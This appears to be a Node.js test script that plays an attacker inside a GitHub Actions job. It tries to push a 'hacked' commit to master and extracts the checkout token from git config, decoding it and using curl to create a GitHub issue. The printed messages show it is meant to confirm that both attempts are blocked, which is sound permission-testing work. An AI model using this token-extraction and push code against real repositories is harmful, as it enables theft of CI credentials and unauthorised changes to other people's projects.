const { execSync } = require('child_process');

console.log("HACKER SCRIPT STARTED...");

// Attack 1: Try pushing a malicious commit to master
try {
  console.log("--- ATTACK 1: Pushing to master ---");
  execSync('git config --global user.name "Evil Hacker"');
  execSync('git config --global user.email "hacker@evil.com"');
  execSync('git commit --allow-empty -m "You have been hacked!"');
  
  // Attempt to push using the token persisted by actions/checkout
  execSync('git push origin HEAD:master', { stdio: 'inherit' });
  
  console.log("❌ ATTACK 1 SUCCESS: Push worked! (This should NOT happen)");
} catch (error) {
  console.log("✅ ATTACK 1 FAILED: Push rejected! (Expected due to contents: read)");
}

// Attack 2: Steal token and abuse GitHub API
try {
  console.log("\n--- ATTACK 2: Extracting token & calling API ---");
  
  // Extract the GitHub token from git config
  const gitConfig = execSync('git config --get http.https://github.com/.extraheader').toString();
  const base64Token = gitConfig.match(/basic (.*)/)[1];
  const token = Buffer.from(base64Token, 'base64').toString().split(':')[1];
  const repo = process.env.GITHUB_REPOSITORY; 
  
  console.log("Creating a malicious issue...");
  
  // Call GitHub API to create an issue using the stolen token
  const response = execSync(`curl -s -o /dev/null -w "%{http_code}" -X POST \
    -H "Authorization: Bearer ${token}" \
    -H "Accept: application/vnd.github.v3+json" \
    https://api.github.com/repos/${repo}/issues \
    -d '{"title":"HACKED!","body":"I stole your repo"}'`).toString();

  if (response === '201') {
    console.log("❌ ATTACK 2 SUCCESS: Issue created! (This should NOT happen)");
  } else {
    console.log(`✅ ATTACK 2 FAILED: Blocked with status ${response}. (Expected 403/404)`);
  }
} catch (error) {
  console.log("✅ ATTACK 2 FAILED: API call blocked.");
}

console.log("HACKER SCRIPT FINISHED.");
